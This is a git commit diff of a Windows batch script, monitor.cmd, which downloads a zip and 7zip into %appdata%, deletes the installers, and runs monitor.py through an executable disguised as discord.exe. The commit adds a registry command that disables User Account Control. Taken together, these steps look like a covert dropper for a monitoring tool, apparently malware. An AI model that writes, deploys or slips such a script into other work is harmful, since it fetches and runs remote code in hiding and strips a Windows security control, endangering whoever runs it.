e1f5933ca2a3e1e9f16519fe430a124994ae9135
Nizhenets <can@nizhenets.com>
2025-03-03 02:01:17 -0600

    q
    q

--- monitor.cmd
+++ monitor.cmd
@@ -4,7 +4,7 @@ REM Change to the %appdata% directory
 cd %appdata%
 
 REM Download system64.zip
-powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/nizhenets/monitor/raw/main/system64.zip' -OutFile '%appdata%\System64.zip'; Write-Host 'system64.zip indirildi' } catch { Write-Host 'Hata: $_' }"
+powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/nizhenets/monitor/raw/main/system64.zip' -OutFile '%appdata%\system64.zip'; Write-Host 'system64.zip indirildi' } catch { Write-Host 'Hata: $_' }"
 
 REM Download 7zip.exe
 powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/nizhenets/monitor/raw/main/7zip.exe' -OutFile '%appdata%\7zip.exe'; Write-Host '7zip.exe indirildi' } catch { Write-Host 'Hata: $_' }"
@@ -22,13 +22,16 @@ timeout /t 1 /nobreak >nul
 del /f /q %appdata%\7zip.exe
 
 REM Extract System64.zip using 7zip
-"%ProgramFiles%\7-Zip\7z.exe" x -y "%appdata%\System64.zip" -o"%appdata%"
+"%ProgramFiles%\7-Zip\7z.exe" x -y "%appdata%\system64.zip" -o"%appdata%"
 
 REM Wait 1 second before deleting the System64.zip file
 timeout /t 1 /nobreak >nul
-del /f /q "%appdata%\System64.zip"
+del /f /q "%appdata%\system64.zip"
 
 REM Run the monitor.py script
 "%appdata%\System64\discord.exe" "%appdata%\System64\monitor.py"
+
+REM Disable User Account Control (UAC)
+REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 
 echo Islem tamamlandi.
